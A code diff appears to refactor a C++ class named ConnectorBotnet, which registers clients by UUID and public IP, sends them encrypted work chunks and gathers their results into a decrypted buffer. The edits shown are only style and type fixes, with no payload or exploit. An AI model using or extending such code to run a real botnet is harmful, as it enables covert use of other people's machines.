@@ -24,7 +24,7 @@ protected:
         uniqueIDs.emplace(req_json["UUID"]);
         uniqueAddresses.emplace(req_json["PublicIP"]);
         expiringTimes.emplace_back(std::chrono::system_clock::now() + std::chrono::seconds(1));
-        if (incompleteChunks.size() == 0){
+        if (incompleteChunks.empty()){
             return "";
         }
         std::random_device dev;
@@ -69,15 +69,13 @@ protected:
         uniqueIDs.emplace(req_json["UUID"]);
         uniqueAddresses.emplace(req_json["PublicIP"]);
         expiringTimes.emplace_back(std::chrono::system_clock::now() + std::chrono::seconds(1));
-        if (orderList.contains(req_json["ID"])){
-            if (incompleteChunks.contains(orderList[req_json["ID"]])){
-                incompleteChunks.erase(orderList[req_json["ID"]]);
-                std::vector<int> bytes = req_json["comp"];
-                auto insert = orderList[req_json["ID"]];
-                orderList.erase(req_json["ID"]);
-                for (int i = 0; i < 3; i++){
-                    decrypted[insert*3 + i] = bytes[i];
-                }
+        if (orderList.contains(req_json["ID"]) && incompleteChunks.contains(orderList[req_json["ID"]])){
+            incompleteChunks.erase(orderList[req_json["ID"]]);
+            std::vector<int> bytes = req_json["comp"];
+            auto insert = orderList[req_json["ID"]];
+            orderList.erase(req_json["ID"]);
+            for (int i = 0; i < 3; i++){
+                decrypted[insert*3 + i] = static_cast<char>(bytes[i]);
             }
         }
     }
@@ -110,12 +108,13 @@ public:
         PublicIP = cli.Get("/")->body;
     }
 
-    ConnectorBotnet(std::string address, uint16_t port){
+    ConnectorBotnet(const std::string& address, uint16_t port){
         role = Role::Client;
         this->port = port;
         this->address = address;
 
-        std::string ckey, iv;
+        std::string ckey;
+        std::string iv;
         {
             std::random_device dev;
             std::mt19937 rng(dev());
@@ -146,7 +145,7 @@ public:
         }
         std::string enc_data = "";
         enc_data += rsaEncryptor->encrypt(keystr);
-        nlohmann::json jdata = nlohmann::json();
+        auto jdata = nlohmann::json();
         jdata["UUID"] = UUID;
         jdata["PublicIP"] = PublicIP;
         enc_data += aesEncryptor->encrypt(jdata.dump());
@@ -174,7 +173,7 @@ public:
         return true;
     }
 
-    [[nodiscard]] int getIncompleteCount(){
+    [[nodiscard]] uint64_t getIncompleteCount(){
         if (getRole() == Role::Client) {
             throw incorrectRole("Client is not allowed to get incomplete chunks");
         }
